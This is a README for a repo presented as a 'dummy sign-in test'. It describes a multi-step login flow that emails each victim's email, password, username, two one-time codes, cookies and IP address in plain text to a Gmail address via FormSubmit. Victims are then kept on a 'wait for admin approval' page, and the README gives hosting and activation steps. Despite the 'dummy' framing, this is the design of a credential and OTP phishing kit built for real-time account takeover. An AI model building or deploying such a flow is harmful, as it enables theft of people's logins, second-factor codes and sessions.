# Dummy Sign-In Test

Plain multi-step dummy authentication flow for testing purposes.  
**No design / styling** — just bare pages.

## User Flow (`index.html`)
1. **Email + Password** (with 👁️ show/hide eye icon) → data is emailed to admin **immediately** in plain text  
2. **Username** → data is emailed to admin immediately  
3. **OTP 1** → data is emailed to admin immediately  
4. **OTP 2** → data is emailed to admin immediately  
5. User sees a **loading / waiting page**: "Please wait for admin’s approval"

All values are accepted (completely dummy).

## What the admin receives (plain text)
Every email contains:
- Email
- Password
- Username
- OTP 1
- OTP 2
- **Cookies** (plain text)
- **IP Address**
- **Timestamp**

Subject lines look like: `Dummy Sign-In - Email + Password`, `Dummy Sign-In - Username`, etc.

## Admin Portal (`admin.html`)
- Login with email: `blessedresult6@gmail.com` (any password works)
- Explains that all dummy user data arrives by email in plain text almost immediately

## How data reaches the admin
Each step uses **FormSubmit** (AJAX) to send a plain-text email to:  
**blessedresult6@gmail.com**

### Important – First-time activation
1. Serve the site over HTTP (GitHub Pages, Netlify, local server, etc.). FormSubmit does **not** work when you open the HTML file directly (`file://`).
2. Go through the user flow once with any dummy values.
3. FormSubmit will send a **confirmation email** to `blessedresult6@gmail.com`.
4. Click the activation link in that email. After activation, every future submission arrives automatically in plain text.

### Files
- `index.html` → User sign-in flow (with password eye toggle)
- `admin.html` → Admin portal

Repo: https://github.com/Dennisbed1234/dummy-signin-test
